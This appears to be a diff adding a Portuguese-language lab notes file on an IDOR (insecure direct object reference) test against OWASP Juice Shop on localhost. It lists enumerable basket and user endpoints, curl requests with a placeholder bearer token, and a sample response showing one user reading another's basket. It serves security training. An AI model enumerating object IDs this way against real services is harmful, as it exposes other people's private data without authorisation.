@@ -1,0 +1,63 @@
+# ============================================================
+# IDOR (Insecure Direct Object Reference) - OWASP Juice Shop
+# Autor: Daniel de Souza de Aguiar
+# Data: Abril/2026
+# ============================================================
+
+# ------------------------------------------------------------
+# 1. ENDPOINTS DE API TESTADOS
+# ------------------------------------------------------------
+
+# Endpoint base
+http://localhost:3000/rest/basket/
+
+# Carrinhos de diferentes usuários (IDOR confirmado)
+http://localhost:3000/rest/basket/1
+http://localhost:3000/rest/basket/2
+http://localhost:3000/rest/basket/3
+http://localhost:3000/rest/basket/4
+http://localhost:3000/rest/basket/5
+
+# ------------------------------------------------------------
+# 2. ENDPOINTS DE USUÁRIO
+# ------------------------------------------------------------
+
+# Perfis de usuário
+http://localhost:3000/rest/users/1
+http://localhost:3000/rest/users/2
+http://localhost:3000/rest/users/3
+
+# Endpoint de produtos
+http://localhost:3000/rest/products/1
+http://localhost:3000/rest/products/2
+http://localhost:3000/rest/products/3
+
+# ------------------------------------------------------------
+# 3. COMANDOS CURL PARA TESTE
+# ------------------------------------------------------------
+
+# Comando base (sem autenticação - retorna 401)
+curl -X GET http://localhost:3000/rest/basket/2
+
+# Comando com token de autenticação (funciona)
+curl -X GET http://localhost:3000/rest/basket/2 \
+  -H "Authorization: Bearer [TOKEN_DO_USUARIO]"
+
+# ------------------------------------------------------------
+# 4. EVIDÊNCIA DE IDOR
+# ------------------------------------------------------------
+
+# O usuário autenticado consegue acessar carrinhos de outros usuários
+# apenas alterando o ID na URL, sem verificação de autorização no servidor.
+
+# Exemplo de resposta bem-sucedida para /rest/basket/2:
+{
+  "status": "success",
+  "data": {
+    "id": 2,
+    "UserId": 2,
+    "Products": [...]
+  }
+}
+
+# ============================================================
